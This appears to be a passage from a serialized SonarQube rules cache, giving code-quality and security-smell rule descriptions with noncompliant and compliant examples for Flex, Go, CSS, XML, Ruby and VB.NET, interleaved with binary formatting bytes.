  <li> <a href="https://www.securecoding.cert.org/confluence/x/i4FtAg">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>Z
CODE_SMELL
∑

flex:S1445®
flexS14451Constructors should not have a "void" return type"MINOR*flex:Ã<p>Even though this is syntactically correct, the <code>void</code> return type should not be used in the signature of a constructor. Indeed some
developers might be confused by this syntax, believing that the constructor is in fact a standard function. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  public function Foo() : void
  {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  public function Foo()
  {...}
}
</pre>Z
CODE_SMELL
™

flex:S1444õ
flexS1444)"public static" fields should be constant"MINOR*flex:ƒ<p>There is no good reason to declare a field "public" and "static" without also declaring it "const". Most of the time this is a kludge to share a
state among several objects. But with this approach, any object can do whatever it wants with the shared state, such as setting it to
<code>null</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Greeter {
  public static var foo:Foo = new Foo(...);
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Greeter {
  public static const FOO:Foo = new Foo(...);
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/500.html">MITRE, CWE-500</a> - Public Static Field Not Marked Final </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QQBqAQ">CERT OBJ10-J.</a> - Do not use public static nonfinal fields </li>
</ul>ZVULNERABILITY
√

flex:S1125¥
flexS1125(Boolean literals should not be redundant"MINOR*flex:·<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (booleanMethod() == true) { /* ... */ }
if (booleanMethod() == false) { /* ... */ }
if (booleanMethod() || false) { /* ... */ }
doSomething(!false);
doSomething(booleanMethod() == true);

booleanVariable = booleanMethod() ? true : false;
booleanVariable = booleanMethod() ? true : exp;
booleanVariable = booleanMethod() ? false : exp;
booleanVariable = booleanMethod() ? exp : true;
booleanVariable = booleanMethod() ? exp : false;
</pre>
<h2>Compliant Solution</h2>
<pre>
if (booleanMethod()) { /* ... */ }
if (!booleanMethod()) { /* ... */ }
if (booleanMethod()) { /* ... */ }
doSomething(true);
doSomething(booleanMethod());

booleanVariable = booleanMethod();
booleanVariable = booleanMethod() || exp;
booleanVariable = !booleanMethod() &amp;&amp; exp;
booleanVariable = !booleanMethod() || exp;
booleanVariable = booleanMethod() &amp;&amp; exp;
</pre>Z
CODE_SMELL
≈

flex:S1442∂
flexS1442$"Alert.show(...)" should not be used"MINOR*flex:‰<p><code>Alert.show(...)</code> can be useful for debugging during development, but in production mode this kind of pop-up could expose sensitive
information to attackers, and should never be displayed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if(unexpectedCondition)
{
  Alert.show("Unexpected Condition");
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
</ul>ZVULNERABILITY
Ÿ
	flex:S100À
flexS1005Function names should comply with a naming convention"MINOR*flex:Ï<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression: ^[a-z][a-zA-Z0-9]*$</p>
<pre>
function DoSomething(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(){...}
</pre>Z
CODE_SMELL
Á
	flex:S101Ÿ
flexS1012Class names should comply with a naming convention"MINOR*flex:˝<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
public class myClass {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {...}
</pre>Z
CODE_SMELL
ø

flex:S1481∞
flexS1481(Unused local variables should be removed"MINOR*flex:›<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public function numberOfMinutes(hours:int):int
{
  var seconds:int = 0;  // seconds is never used
  return hours * 60;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public function numberOfMinutes(hours:int):int
{
  return hours * 60;
}
</pre>Z
CODE_SMELL
™
go:S1313ù
goS13132Using hardcoded IP addresses is security-sensitive"MINOR*go:¡<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var (
  ip   = "192.168.12.42"
  port = 3333
)

SocketClient(ip, port)
</pre>
<h2>Compliant Solution</h2>
<pre>
config, err := ReadConfig("properties.ini")

ip := config["ip"]
port := config["ip"]

SocketClient(ip, port)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID). </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>ZVULNERABILITY
∏
go:S4663´
goS4663'Multi-line comments should not be empty"MINOR*go:›<p>An empty multi-line comment is likely to be a mistake and doesn't help to improve the readability of the code. For these reasons, it should be
removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/* */

/*

 */
</pre>Z
CODE_SMELL
Ø
go:S1940¢
goS1940%Boolean checks should not be inverted"MINOR*go:÷<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( !(a == 2)) { ...}  // Noncompliant
boolean b = !(i &lt; 10);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a != 2) { ...}
boolean b = (i &gt;= 10);
</pre>Z
CODE_SMELL
˙
go:S1125Ì
goS1125(Boolean literals should not be redundant"MINOR*go:û<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if boolFunc() || false {
    // ...
}

flag := x &amp;&amp; true
</pre>
<h2>Compliant Solution</h2>
<pre>
if boolFunc() {
    // ...
}

flag := x
</pre>Z
CODE_SMELL
Ë
go:S100‹
goS100@Function and method names should comply with a naming convention"MINOR*go:ˆ<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression: <code>^(_|[a-zA-Z0-9]+)$</code>:</p>
<pre>
func execute_all() {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func executeAll() {
...
}
</pre>Z
CODE_SMELL
Ü
go:S117˙
goS117RLocal variable and function parameter names should comply with a naming convention"MINOR*go:Ç<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^(_|[a-zA-Z0-9]+)$</code>:</p>
<pre>
func doSomething(my_param int) { // Noncompliant
  var local_ int; // Noncompliant
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func doSomething(myParam int) {
  var local int;
  ...
}{code}
</pre>Z
CODE_SMELL
ª
	css:S4663≠
cssS4663'Multi-line comments should not be empty"MINOR*css:›<p>An empty multi-line comment is likely to be a mistake and doesn't help to improve the readability of the code. For these reasons, it should be
removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/* */

/*

 */
</pre>Z
CODE_SMELL
˘
	css:S1128Î
cssS1128#Duplicate imports should be removed"MINOR*css:ü<p>Having the import of the same file twice, makes one of them useless. Leaving them in reduces the code's readability, since their presence can be
confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@import 'a.css';
@import 'a.css'; // Noncompliant

@import url("a.css");
@import url("a.css"); // Noncompliant
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>@import</code> in <code>less</code> files.</p>Z
CODE_SMELL
È

	css:S1116€

cssS1116"Extra semicolons should be removed"MINOR*css:ê
<p>Extra semicolons are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by one more property declaration, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that
  the first character following the null statement is a white-space character. </li>
  <li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided
  that the first character following the null statement is a white-space character. </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7gCTAw">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/i4FtAg">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>Z
CODE_SMELL
¨
xml:IllegalTabCheckî
xmlIllegalTabCheck(Tabulation characters should not be used"MINOR*xml:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
Ë
xml:IndentCheck‘
xmlIndentCheck+Source code should be indented consistently"MINOR*xml:˙<p>Proper indentation is a simple and effective way to improve the code's readability. Consistent indentation among the developers within a team also
reduces the differences that are committed to source control systems, making code reviews easier. </p>
<p>By default this rule checks that each block of code is indented, although it does not check the size of the indent. Parameter "indentSize" allows
the expected indent size to be defined. Only the first line of a badly indented section is reported.</p>Z
CODE_SMELL
≤
common-ruby:FailedUnitTestsí
common-rubyFailedUnitTests!Failed unit tests should be fixed"MAJOR*ruby:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
Û
common-ruby:DuplicatedBlocks“
common-rubyDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*ruby:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ù
&common-ruby:InsufficientCommentDensityÚ
common-rubyInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*ruby:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
è
common-ruby:SkippedUnitTestsÓ
common-rubySkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*ruby:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
È
&common-ruby:InsufficientBranchCoverageæ
common-rubyInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*ruby:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
›
$common-ruby:InsufficientLineCoverage¥
common-rubyInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*ruby:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
Œ

ruby:S1134ø
rubyS1134Track uses of "FIXME" tags"MAJOR*ruby:˙<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def divide(numerator, denominator)
  return numerator / denominator             # FIXME denominator value might be 0
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
•

ruby:S1871ñ
rubyS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*ruby:î<p>Having two <code>when</code> clauses in a <code>case</code> statement or two branches in an <code>if</code> chain with the same implementation is
at best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they
should be combined, or for a <code>case</code>, duplicates should be refactored. </p>
<h2>Noncompliant Code Example</h2>
<pre>
case i
  when 1
    doFirstThing()
    doSomething()
  when 2
    doSomethingDifferent()
  when 3 # Noncompliant; duplicates case 1's implementation
    doFirstThing()
    doSomething()
  else
    doTheRest()
end

if a &gt;= 0 &amp;&amp; a &lt; 10
  doFirstThing()
  doTheThing()
elsif a &gt;= 10 &amp;&amp; a &lt; 20
  doTheOtherThing()
elsif a &gt;= 20 &amp;&amp; a &lt; 50
  doFirstThing()
  doTheThing()   # Noncompliant; duplicates first condition
else
  doTheRest()
end
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>case</code> statement that contain a
single line of code.</p>
<pre>
if a ==
  doSomething()  # no issue, usually this is done on purpose to increase the readability
elsif a == 2
  doSomethingElse()
else
  doSomething()
end
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>case</code>-es without <code>else</code>
clauses when all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>case</code>-es
with <code>else</code> clauses, rule <a href='/coding_rules#rule_key=ruby%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if a == 1
  doSomething()  # Noncompliant, this might have been done on purpose but probably not
elsif a == 2
  doSomething()
end
</pre>Z
CODE_SMELL
ö

ruby:S1110ã
rubyS11100Redundant pairs of parentheses should be removed"MAJOR*ruby:∞<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
x = (y / 2 + 1)  # Compliant even if the parenthesis are ignored by the compiler

if a &amp;&amp; ((x+y &gt; 0))  # Noncompliant
  # ...
end

return ((x + 1)) # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
x = (y / 2 + 1)

if a &amp;&amp; (x+y &gt; 0)
  # ...
end

return (x + 1)
</pre>Z
CODE_SMELL
≤

ruby:S4144£
rubyS41441Methods should not have identical implementations"MAJOR*ruby:«<p>When two methods have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but may
be confusing to maintainers. In the latter case, one implementation should invoke the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Box
  def initialize(length, width, height)
    @length, @width, @height = length, width, height
  end

  def getVolume
    area = @length * @width
    return area * @height
  end

  def getArea                  # Noncompliant, implementation is identical to "getVolume"
    area = @length * @width
    return area * @height
  end
end
</pre>
<h2>Compliant Solution</h2>
<pre>
class Box
  def initialize(length, width, height)
    @length, @width, @height = length, width, height
  end

  def getVolume
    return getArea * @height
  end

  def getArea
    return @length * @width
  end
end
</pre>
<h2>Exceptions</h2>
<p>Methods with fewer than 2 statements are ignored.</p>Z
CODE_SMELL
∫
ruby:ParsingError§
rubyParsingErrorRuby parser failure"MAJOR*ruby:ﬂ<p>When the parser fails, it is possible to record the failure as an issue on the file. This way, not only is it possible to track the number of files
that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
’

ruby:S1479∆
rubyS14799"case" statements should not have too many "when" clauses"MAJOR*ruby:‚<p>When <code>case</code> statements have a large number of clauses, it is usually an attempt to map two sets of data. A real <code>Hash</code>
structure would be more readable and maintainable, and should be used instead.</p>Z
CODE_SMELL
ó

ruby:S1656à
rubyS1656%Variables should not be self-assigned"MAJOR*ruby:ø<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def set_name(name)
  name = name
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def set_name(name)
  @name = name
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
«
	ruby:S103π
rubyS103Lines should not be too long"MAJOR*ruby:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
Û

ruby:S1151‰
rubyS1151:"case when" clauses should not have too many lines of code"MAJOR*ruby:ˇ<p>The <code>case</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>when</code> clause
contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the case clause
should be extracted into a dedicated function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the threshold set at 5:</p>
<pre>
case myVariable
when 0 then # Noncompliant: 6 lines till next "when"
    methodCall1("")
    methodCall2("")
    methodCall3("")
    methodCall4("")
    methodCall5("")
    methodCall6("")
when 1
   # ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
case myVariable
when 0 then
  doSomething()
when 1
   # ...
end
...
def doSomething()
    methodCall1("")
    methodCall2("")
    methodCall3("")
    methodCall4("")
    methodCall5("")
    methodCall6("")
end
</pre>Z
CODE_SMELL
ﬁ

ruby:S1172œ
rubyS1172,Unused function parameters should be removed"MAJOR*ruby:¯<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
›
	ruby:S104œ
rubyS104,Files should not have too many lines of code"MAJOR*ruby:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
Ñ
	ruby:S107ˆ
rubyS107-Functions should not have too many parameters"MAJOR*ruby:ü<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>Z
CODE_SMELL
ø
	ruby:S108±
rubyS108.Nested blocks of code should not be left empty"MAJOR*ruby:Ÿ<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def compute(a, b)
  sum = a + b
  if  sum &gt; 0 # Noncompliant; empty on purpose or missing piece of code?
  end
  puts "Result: #{sum}"
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def compute(a, b)
  sum = a + b
  if  sum &gt; 0
    puts "Positive result"
  end
  puts "Result: #{sum}"
end
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>
<p><code>while</code> and <code>unless</code> loops are also exception to the rule.</p>
<pre>
while @order.process_next; end # Compliant
</pre>Z
CODE_SMELL
°

ruby:S1764í
rubyS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*ruby:£<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Exceptions</h2>
<p>This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=ruby%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
æ

ruby:S1862Ø
rubyS1862WRelated "if/elsif" statements and "when" in a "case" should not have the same condition"MAJOR*ruby:¥<p>A <code>case</code> and a chain of <code>if</code>/<code>elsif</code> statements is evaluated from top to bottom. At most, only one branch will be
executed: the first one with a condition that evaluates to <code>true</code>.</p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>
<p>For a <code>case</code>, the second <code>when</code> will never be executed, rendering it dead code. Worse there is the risk in this situation
that future maintenance will be done on the dead case, rather than on the one that's actually used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if param == 1
  openWindow()
elsif param == 2
  closeWindow()
elsif param == 1  # Noncompliant
  moveWindowToTheBackground()
end

case i
  when 1
    # ...
  when 3
    # ...
  when 1  # Noncompliant
    # ...
  else
    # ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
if param == 1
  openWindow()
elsif param == 2
  closeWindow()
elsif param == 3
  moveWindowToTheBackground()
end

case i
  when 1
    # ...
  when 3
    # ...
  else
    # ...
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
∆

ruby:S1145∑
rubyS1145AUseless "if true ..." and "if false ..." blocks should be removed"MAJOR*ruby:“
<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if true
  doSomething()
end
...
if false
  doSomethingElse()
end
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething()
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>ZBUG
é


ruby:S1763ˇ	
rubyS17633Jump statements should not be followed by dead code"MAJOR*ruby:®	<p>Jump statements (<code>return</code>, <code>break</code> and <code>next</code>) move control flow out of the current code block. So any statements
that come after a jump are dead code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
def foo(a)
  i = 10
  return a + i    # Noncompliant
  i += 1          # dead code
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def foo(a)
  i = 10
  return a + i
end
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/561.html">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
Î

ruby:S1066‹
rubyS1066,Collapsible "if" statements should be merged"MAJOR*ruby:Ö<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if !filename.nil?
  if File.file?(filename) || File.directory?(filename)
    # ...
  end
end

if a then
  unless b then
    # ...
  end
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def isFileOrDirectory(filename)
  File.file?(filename) || File.directory?(filename)
end
# ...

if !filename.nil? &amp;&amp; isFileOrDirectory(filename)
  # ...
end

if a &amp;&amp; !b then
  # ...
end
</pre>Z
CODE_SMELL
“
	ruby:S122ƒ
rubyS122&Statements should be on separate lines"MAJOR*ruby:Ù<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if someCondition; puts "hello"; end
</pre>
<h2>Compliant Solution</h2>
<pre>
if someCondition
  puts "hello"
end
</pre>Z
CODE_SMELL
Î

ruby:S2757‹
rubyS2757'"=+" should not be used instead of "+=""MAJOR*ruby:ë<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
target = -5
num = 3

target =- num # Noncompliant; target = -3. Is that really what's meant?
target =+ num # Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
target = -5
num = 3

target = -num # Compliant; intent to assign inverse value of num is clear
target += num
</pre>ZBUG
◊

ruby:S3923»
rubyS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*ruby:Õ<p>Having all branches in a <code>case</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>case</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if b == 0  # Noncompliant
  doOneMoreThing()
else
  doOneMoreThing()
end

b = a &gt; 12 ? 4 : 4;  # Noncompliant

case i  # Noncompliant
  when 1
    doSomething()
  when 2
    doSomething()
  when 3
    doSomething()
  else
    doSomething()
end
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains or <code>case</code>-es without <code>else</code>-s.</p>
<pre>
if b == 0 # no issue, this could have been done on purpose to make the code more readable
  doSomething()
elsif b == 1
  doSomething()
end
</pre>ZBUG
Ñ
	ruby:S138ˆ
rubyS1380Functions should not have too many lines of code"MAJOR*ruby:ú<p>A function that grows too large tends to aggregate too many responsibilities.</p>
<p>Such functions inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.</p>
<p>Those smaller functions will not only be easier to understand, but also probably easier to test.</p>Z
CODE_SMELL
ñ
vbnet:S1654Ü
vbnetS16543Method parameters should follow a naming convention"MAJOR*vbnet:¶<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.</p>
<p>This rule allows to check that all parameter names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Camel casing, starting with a lower case character, e.g. backColor </li>
  <li> Short abbreviations of 2 letters can be capitalized only when not at the beginning, e.g. id, productID </li>
  <li> Longer abbreviations need to be lower cased, e.g. html </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code></p>
<pre>
Module Module1
    Sub GetSomething(ByVal ID As Integer) ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub GetSomething(ByVal id As Integer) ' Compliant
    End Sub
End Module
</pre>Z
CODE_SMELL
Ñ
vbnet:S1134Ù
vbnetS1134Track uses of "FIXME" tags"MAJOR*vbnet:≠<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Function Divide(ByVal numerator As Integer, ByVal denominator As Integer) As Integer
    Return numerator / denominator  ' FIXME denominator value might be  0
End Function
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
•	

vbnet:S112ñ	
